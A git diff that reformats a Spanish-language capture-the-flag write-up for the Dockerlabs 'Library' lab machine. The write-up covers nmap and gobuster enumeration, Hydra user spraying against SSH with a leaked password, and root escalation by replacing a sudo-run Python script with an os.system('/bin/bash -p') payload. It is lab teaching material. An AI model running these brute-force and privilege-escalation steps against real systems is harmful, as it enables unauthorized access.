@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Library 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Library ​​
+
+## 🖥️ Writeup - Library
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Gobuster` `Information Leakage` `Hydra` `User Spraying` `Sudoers` `Python` `Writable Directory`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip library.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh library.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 17:15 CET
 Nmap scan report for 172.17.0.2
@@ -82,7 +91,7 @@ Se detectan los puertos `22` (SSH) y `80` (HTTP) abiertos.
 
 Accedemos al puerto `80` y nos encontramos con la página de `Apache2` por defecto.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -91,6 +100,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -113,25 +123,24 @@ Starting gobuster in directory enumeration mode
 Progress: 1387269 / 1543899 (89.85%)
 ```
 
-Encontramos un directorio `/javascript` y un archivo `index.php`.
-Accedemos al archivo `index.php` y encontramos una cadena de texto:
+Encontramos un directorio `/javascript` y un archivo `index.php`. Accedemos al archivo `index.php` y encontramos una cadena de texto:
 
-![alt text](../../images/indexphp.png)
+![alt text](../../.gitbook/assets/indexphp.png)
 
 Esta cadena parece ser una contraseña, pero en este punto desconocemos los usuarios existentes en el sistema.
 
-Mi primer pensamiento fue intentar explotar una vulnerabilidad `LFI` (Local File Inclusion) en `index.php` para leer el archivo `/etc/passwd` y así obtener una lista de usuarios. 
-Sin embargo, no encontré ningún parámetro vulnerable.
+Mi primer pensamiento fue intentar explotar una vulnerabilidad `LFI` (Local File Inclusion) en `index.php` para leer el archivo `/etc/passwd` y así obtener una lista de usuarios. Sin embargo, no encontré ningún parámetro vulnerable.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
-Vamos a realizar un ataque de `user spraying` contra el servicio ` SSH`, utilizando como contraseña cadena de texto que hemos encontrado antes: `JIFGHDS87GYDFIGD`.
+Vamos a realizar un ataque de `user spraying` contra el servicio `SSH`, utilizando como contraseña cadena de texto que hemos encontrado antes: `JIFGHDS87GYDFIGD`.
 
 ```bash
 hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD -t 64 ssh://172.17.0.2
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -151,7 +160,7 @@ Utilizamos estas credenciales para autenticarnos exitosamente en el sistema a tr
 ssh carlos@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -160,6 +169,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for carlos on 34c374d12f02:
     env_reset, mail_badpass,
@@ -170,8 +180,7 @@ User carlos may run the following commands on 34c374d12f02:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
 ```
 
-Vemos que podemos ejecutar el archivo `script.py`, situado en el directorio `/opt`, con privilegios de `root`.
-Al verificar los permisos del archivo, observamos que no tenemos permisos de escritura sobre él. 
+Vemos que podemos ejecutar el archivo `script.py`, situado en el directorio `/opt`, con privilegios de `root`. Al verificar los permisos del archivo, observamos que no tenemos permisos de escritura sobre él.
 
 Sin embargo, en el directorio `/opt` tenemos permisos para eliminar el `script.py` original y crear un archivo nuevo con el mismo nombre, que contenga nuestro `payload` de escalada de privilegios.
 
@@ -181,6 +190,7 @@ nano script.py
 ```
 
 Código:
+
 ```
 import os
 os.system('/bin/bash -p')
@@ -193,6 +203,7 @@ sudo /usr/bin/python3 /opt/script.py
 ```
 
 Info:
+
 ```
 root@34c374d12f02:/opt# whoami
 root
